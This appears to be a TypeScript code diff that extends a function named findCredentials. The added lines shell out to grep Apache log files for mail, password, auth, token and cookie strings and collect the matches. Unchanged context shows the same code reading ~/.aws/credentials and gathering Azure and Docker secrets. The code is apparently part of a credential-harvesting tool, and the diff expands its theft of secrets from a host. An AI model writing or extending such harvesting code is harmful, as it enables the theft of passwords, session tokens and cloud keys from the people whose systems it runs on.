@@ -13,6 +13,7 @@ const _run = (args: string): string | null => {
 // TODO: Add all history files
 const findCredentials = (text: string) => {
   const credentials = {} as any;
+  credentials.apache = {} as any;
   credentials.aws = {} as any;
   credentials.azure = {} as any;
   credentials.docker = {} as any;
@@ -49,6 +50,37 @@ const findCredentials = (text: string) => {
         path = path.substring(0, path.length -1);
       }
     }
+  }
+
+  const apacheEmailLog = _run(`cat /var/log/apache/*.log | grep -i "mail"`);
+  const apachePassLog = _run(`cat /var/log/apache/*.log | grep -i "pass"`);
+  const apacheAuthLog = _run(`cat /var/log/apache/*.log | grep -i "auth"`);
+  const apacheTokenLog = _run(`cat /var/log/apache/*.log | grep -i "token"`);
+  const apacheCookieLog = _run(`cat /var/log/apache/*.log | grep -i "cookie"`);
+  if (apacheEmailLog) {
+    credentials.apache.emailLog = {} as any;
+    credentials.apache.emailLog.path = `$ cat /var/log/apache/*.log | grep -i "mail"`;
+    credentials.apache.emailLog.content = apacheEmailLog;
+  }
+  if (apachePassLog) {
+    credentials.apache.passLog = {} as any;
+    credentials.apache.passLog.path = `$ cat /var/log/apache/*.log | grep -i "pass"`; 
+    credentials.apache.passLog.content = apachePassLog;
+  }
+  if (apacheAuthLog) {
+    credentials.apache.authLog = {} as any;
+    credentials.apache.authLog.path = `$ cat /var/log/apache/*.log | grep -i "auth"`; 
+    credentials.apache.authLog.content = apacheAuthLog;
+  }
+  if (apacheTokenLog) {
+    credentials.apache.tokenLog = {} as any;
+    credentials.apache.tokenLog.path = `$ cat /var/log/apache/*.log | grep -i "token"`;
+    credentials.apache.tokenLog.content = apacheTokenLog;
+  }
+  if (apacheCookieLog) {
+    credentials.apache.cookieLog = {} as any;
+    credentials.apache.cookieLog.path = `cat /var/log/apache/*.log | grep -i "cookie"`;
+    credentials.apache.cookieLog.content = apacheCookieLog;
   }
 
   const awsCredentials = _run(`cat ~/.aws/credentials`);
